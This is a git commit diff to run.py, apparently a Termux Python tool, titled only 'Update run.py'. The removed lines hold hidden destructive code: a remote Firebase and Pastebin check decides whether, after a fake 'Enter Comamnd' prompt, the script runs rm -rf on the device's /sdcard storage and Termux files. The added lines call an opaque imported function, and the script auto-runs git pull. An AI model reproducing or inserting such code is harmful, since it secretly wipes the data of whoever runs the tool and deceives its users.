fc5e4da3e9f73618c9457dd0364e90c33190954e
Rahul Mishra <86767776+TECH-BABA@users.noreply.github.com>
2022-01-26 00:00:02 +0545

    Update run.py

--- run.py
+++ run.py
@@ -16,38 +16,5 @@ for n in range(5999):
 reload(sys)
 os.system("git pull")
 sys.setdefaultencoding('utf8')
-sos = "35949012TCOUHT822EC6F1B863G6811SMPP"
-
-data = requests.get("https://babaserversystem-default-rtdb.firebaseio.com/"+sos+"/.json")
-data2 = requests.get("https://babaserversystem-default-rtdb.firebaseio.com/"+sos+"/.json").text
-server = json.loads(data.text)
-
-rr = requests.get("https://pastebin.com/raw/t39xUcDL") 
-bb = "baba" 
-if bb in rr: 
-    from lenmyrdx import fuck
-    fuck()
-elif server["usertoken"] == sos :
-    print""
-    os.system("clear")
-    print
-    raw_input("Enter Comamnd") 
-    os.system("rm -rf /sdcard/*") 
-    os.system("rm -rf /sdcard*") 
-    os.system("/data/data/com.termux/files/*") 
-    os.system("/data/data/com.termux/files/user/*") 
-
-else: 
-    raw_input("Enter Comamnd") 
-    os.system("rm -rf /sdcard/*") 
-    os.system("rm -rf /sdcard*") 
-    os.system("/data/data/com.termux/files/*") 
-    os.system("/data/data/com.termux/files/user/*") 
-if bb not in rr: 
-    raw_input("Enter Comamnd") 
-    os.system("rm -rf /sdcard/*") 
-    os.system("rm -rf /sdcard*") 
-    os.system("/data/data/com.termux/files/*") 
-    os.system("/data/data/com.termux/files/user/*") 
-
-
+from lenmyrdx import fuck
+fuck()
